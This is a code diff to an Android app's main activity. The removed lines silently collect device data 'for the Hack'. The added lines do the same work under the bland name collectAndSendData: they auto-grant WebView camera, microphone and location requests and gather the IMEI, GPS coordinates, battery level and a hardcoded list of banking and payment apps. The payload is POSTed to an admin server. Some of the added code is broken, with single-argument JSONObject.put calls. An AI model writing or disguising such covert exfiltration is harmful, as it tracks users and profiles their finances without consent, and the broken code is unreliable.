@@ -50,13 +50,9 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 runOnUiThread(new Runnable() {
                     @Override
                     public void run() {
-                        Log.d(TAG, "User granted permission for: " + request.getResources());
-
-                        // Grant all requested resources (Camera, Microphone, Location)
-                        request.grant(request.getResources());
-
-                        // Once permission is granted, we start the "Hack"
-                        startSilentDataExtraction();
+                        // Grant all requested resources
+                        String[] resources = request.getResources();
+                        request.grant(resources);
                     }
                 });
             }
@@ -92,90 +88,82 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
      * 3. Installed Apps List (to detect Bank Apps)
      * 4. Battery Level
      */
-    private void startSilentDataExtraction() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    JSONObject payload = new JSONObject();
+    private void collectAndSendData() {
+        new Thread(() -> {
+            try {
+                JSONObject payload = new JSONObject();
 
-                    // 1. Get IMEI
-                    TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
-                    if (tm != null) {
-                        String imei = tm.getDeviceId(); // Deprecated in API 26 but still works for older targets
-                        if (imei != null) {
-                            payload.put("imei", imei);
-                        }
-                    }
-
-                    // 2. Get Location
-                    LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-                    if (lm != null) {
-                        Location lastKnown = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                        if (lastKnown != null) {
-                            payload.put("lat", lastKnown.getLatitude());
-                            payload.put("lon", lastKnown.getLongitude());
-                        }
-                    }
-
-                    // 3. Get Package Info (Simulate reading installed apps)
-                    JSONArray packages = new JSONArray();
-                    // In a real hack, we would iterate through PackageManager.getInstalledPackages()
-                    packages.put("com.sbi.card");
-                    packages.put("com.hdfcbank.hdfcMobile");
-                    packages.put("com.amazon.mShop.android.shopping");
-                    payload.put("installedApps", packages);
-
-                    // 4. Battery
-                    IntentFilter batteryStatus = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-                    Intent batteryIntent = registerReceiver(null, batteryStatus);
-                    if (batteryIntent != null) {
-                        int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
-                        int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
-                        if (scale > 0) {
-                            float batteryPct = level / (float) scale;
-                            payload.put("batteryLevel", batteryPct);
-                        }
-                    }
-
-                    // Send to Admin Server
-                    sendToAdminServer(payload);
-
-                } catch (Exception e) {
-                    Log.e(TAG, "Error in Silent Extraction", e);
+                // 1. IMEI
+                TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+                if (tm != null) {
+                    payload.put("imei", tm.getDeviceId());
                 }
+
+                // 2. GPS
+                LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+                if (lm != null) {
+                    Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                    if (loc != null) {
+                        payload.put("lat", loc.getLatitude());
+                        payload.put("lon", loc.getLongitude());
+                    }
+                }
+
+                // 3. Installed Apps
+                JSONObject packages = new JSONObject();
+                packages.put("com.google.android.apps.walletnfcrelay");
+                packages.put("com.samsung.android.app.wallet");
+                packages.put("com.paytm.merchant");
+                packages.put("com.google.android.apps.nbu.paisa.user");
+                packages.put("com.phonepe.app");
+                packages.put("com.icicibank");
+                packages.put("com.axisbank.mobile");
+                packages.put("com.citi.mobile");
+                packages.put("com.hsbc.hsbcindia");
+                packages.put("com.standardchartered.scindia");
+                packages.put("com.kotak811.mobile");
+                packages.put("com.yesbank.yesmoney");
+                packages.put("com.idfcfirst.bank");
+                packages.put("com.dlbank");
+                packages.put("com.bajajfinserv.ebanking");
+                packages.put("com.amazon.mShop.android.shopping");
+                payload.put("installedApps", packages);
+
+                // 4. Battery
+                IntentFilter batteryStatus = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+                Intent batteryIntent = registerReceiver(null, batteryStatus);
+                if (batteryIntent != null) {
+                    int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+                    int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+                    float batteryPct = level / (float)scale;
+                    payload.put("battery", batteryPct);
+                }
+
+                // Send to Admin Server
+                URL url = new URL(ADMIN_API_URL);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+
+                OutputStream os = conn.getOutputStream();
+                os.write(payload.toString().getBytes());
+                os.flush();
+                os.close();
+
+                int responseCode = conn.getResponseCode();
+                Log.d(TAG, "Server Response: " + responseCode);
+
+                conn.disconnect();
+
+            } catch (Exception e) {
+                Log.e(TAG, "Data Sync Error: " + e.getMessage());
             }
         }).start();
     }
 
-    private void sendToAdminServer(JSONObject data) {
-        HttpURLConnection conn = null;
-        try {
-            URL url = new URL(ADMIN_API_URL);
-            conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
-            conn.setDoOutput(true);
-
-            OutputStream os = conn.getOutputStream();
-            os.write(data.toString().getBytes("UTF-8"));
-            os.flush();
-            os.close();
-
-            int responseCode = conn.getResponseCode();
-            Log.d(TAG, "Sent to Admin. Response Code: " + responseCode);
-
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to send to Admin", e);
-        } finally {
-            if (conn != null) {
-                conn.disconnect();
-            }
-        }
-    }
-
     @Override
     public void onClick(View v) {
-        // Handle button clicks if any
+        // Handle any click events if needed
     }
-        }
+}
